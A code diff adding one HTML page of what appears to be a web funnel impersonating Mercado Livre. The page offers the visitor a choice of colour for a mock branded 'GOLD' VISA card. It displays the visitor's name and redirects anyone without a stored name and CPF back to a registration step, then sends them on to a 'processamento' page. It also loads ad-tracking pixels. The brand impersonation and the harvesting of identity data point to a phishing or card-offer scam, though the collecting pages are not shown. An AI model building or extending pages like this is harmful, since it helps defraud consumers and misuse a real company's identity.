@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercado Livre - Personalize</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids async defer></script>
+    <script src="js/utmify-tracker.js"></script>
+    <script src="js/utmify-pixel-tiktok.js"></script>
+    <script src="js/tiktok-pixel-shop.js"></script>
+    <style>
+        .page-content {
+            background: #f5f5f5;
+            min-height: calc(100vh - 56px);
+            padding: 20px;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 20px;
+            font-weight: 800;
+            margin-bottom: 5px;
+            color: #1a1a1a;
+        }
+
+        .section-subtitle {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .fake-card {
+            background: linear-gradient(135deg, #f5c100 0%, #ffde00 100%);
+            border-radius: 16px;
+            padding: 20px;
+            width: 100%;
+            height: 190px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            position: relative;
+            margin-bottom: 20px;
+            transition: background 0.3s;
+        }
+
+        .fake-card.yellow {
+            background: linear-gradient(135deg, #f5c100 0%, #ffde00 100%);
+            color: #1a1a1a;
+        }
+
+        .fake-card.black {
+            background: linear-gradient(135deg, #222 0%, #444 100%);
+            color: #fff;
+        }
+
+        .fake-card.blue {
+            background: linear-gradient(135deg, #3483fa 0%, #2968c8 100%);
+            color: #fff;
+        }
+
+        .card-logo-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .card-logo-row img {
+            height: 22px;
+            width: auto;
+            display: block;
+        }
+
+        .fake-card.black .card-logo-row img,
+        .fake-card.blue .card-logo-row img {
+            filter: brightness(0) invert(1);
+        }
+
+        .card-tier {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.06em;
+        }
+
+        .card-chip {
+            width: 42px;
+            height: 32px;
+            background: linear-gradient(145deg, #cfa855, #e8d4a0, #a8843a);
+            border-radius: 5px;
+            position: absolute;
+            top: 58px;
+            left: 20px;
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.35);
+        }
+
+        .fake-card.black .card-chip,
+        .fake-card.blue .card-chip {
+            background: linear-gradient(145deg, #c4c4c4, #eaeaea, #9a9a9a);
+        }
+
+        .card-contactless {
+            position: absolute;
+            top: 62px;
+            right: 20px;
+            color: inherit;
+            opacity: 0.9;
+        }
+
+        .card-name {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            font-size: 12px;
+            max-width: 58%;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+
+        .card-brand {
+            position: absolute;
+            bottom: 18px;
+            right: 20px;
+            font-size: 22px;
+            font-weight: 800;
+            font-style: italic;
+            letter-spacing: -0.02em;
+        }
+
+        .color-picker {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .color-option {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border: 3px solid transparent;
+            cursor: pointer;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .color-option.active {
+            border-color: #3483fa;
+            transform: scale(1.1);
+        }
+
+        .c-yellow {
+            background: #ffe600;
+        }
+
+        .c-black {
+            background: #222;
+        }
+
+        .c-blue {
+            background: #3483fa;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="app-container app-container--funnel">
+        <header>
+            <a href="cadastro.html" class="header-back" aria-label="Voltar">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"
+                        stroke-linejoin="round" />
+                </svg>
+            </a>
+            <div class="header-logo">
+                <img src="images/Mercado-Livre-logo.png" alt="Mercado Livre" width="150" height="36">
+            </div>
+        </header>
+
+        <div class="page-content">
+            <div id="cardArea">
+                <h2 class="section-title">Personalize seu cartão</h2>
+                <p class="section-subtitle">Escolha sua cor favorita e continue.</p>
+
+                <div class="color-picker">
+                    <div class="color-option c-yellow active" onclick="changeCardColor('yellow', this)"></div>
+                    <div class="color-option c-black" onclick="changeCardColor('black', this)"></div>
+                    <div class="color-option c-blue" onclick="changeCardColor('blue', this)"></div>
+                </div>
+
+                <div class="fake-card yellow" id="theCard">
+                    <div class="card-logo-row">
+                        <img src="images/Mercado-Livre-logo.png" alt="">
+                    </div>
+                    <div class="card-tier">GOLD</div>
+                    <div class="card-chip" aria-hidden="true"></div>
+                    <div class="card-contactless" aria-hidden="true">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M6.5 9.5C6.5 8 8 6.5 9.5 6.5" stroke="currentColor" stroke-width="1.2"
+                                stroke-linecap="round" />
+                            <path d="M5 12C5 8.5 7.5 6 11 6" stroke="currentColor" stroke-width="1.2"
+                                stroke-linecap="round" />
+                            <path d="M5 14.5C5 9.5 9 5.5 14 5.5" stroke="currentColor" stroke-width="1.2"
+                                stroke-linecap="round" />
+                        </svg>
+                    </div>
+                    <div class="card-name" id="cardHolderName">SEU NOME AQUI</div>
+                    <div class="card-brand">VISA</div>
+                </div>
+
+                <p style="font-size: 12px; color: #666; text-align: center; margin-bottom: 20px;">
+                    A cor exibida é ilustrativa e pode variar da cor real do cartão físico.
+                </p>
+
+                <a href="../processamento/index.html" class="btn btn-yellow"
+                    onclick="salvarCardColorAntesSair()">Continuar</a>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+    <script>
+        function cardDisplayName() {
+            try {
+                var n = sessionStorage.getItem("mlNome");
+                if (n && n.trim().length >= 2) {
+                    return n.trim().toUpperCase();
+                }
+            } catch (e) { }
+            return "PORTADOR CARTAO";
+        }
+
+        document.addEventListener("DOMContentLoaded", function () {
+            try {
+                if (!sessionStorage.getItem("mlNome") || !sessionStorage.getItem("mlCpf")) {
+                    window.location.replace("../cadastro/index.html");
+                    return;
+                }
+            } catch (e) { }
+            var el = document.getElementById("cardHolderName");
+            if (el) el.textContent = cardDisplayName();
+            try {
+                var c = (sessionStorage.getItem("mlCardColor") || "yellow").toLowerCase();
+                if (c !== "yellow" && c !== "black" && c !== "blue") c = "yellow";
+                document.querySelectorAll("#cardArea .color-option").forEach(function (o) { o.classList.remove("active"); });
+                var map = { yellow: 0, black: 1, blue: 2 };
+                var sw = document.querySelectorAll("#cardArea .color-option");
+                if (sw[map[c]] != null) sw[map[c]].classList.add("active");
+                var card = document.getElementById("theCard");
+                if (card) card.className = "fake-card " + c;
+            } catch (e2) { }
+        });
+
+        function salvarCardColorAntesSair() {
+            try {
+                var card = document.getElementById("theCard");
+                var c = (card && (card.classList.contains("black") ? "black" : card.classList.contains("blue") ? "blue" : "yellow")) || "yellow";
+                sessionStorage.setItem("mlCardColor", c);
+            } catch (e) { }
+        }
+
+        function changeCardColor(color, el) {
+            document.querySelectorAll("#cardArea .color-option").forEach(function (c) { c.classList.remove("active"); });
+            el.classList.add("active");
+            var card = document.getElementById("theCard");
+            card.className = "fake-card " + color;
+            try { sessionStorage.setItem("mlCardColor", color); } catch (e) { }
+        }
+
+    </script>
+</body>
+
+</html>
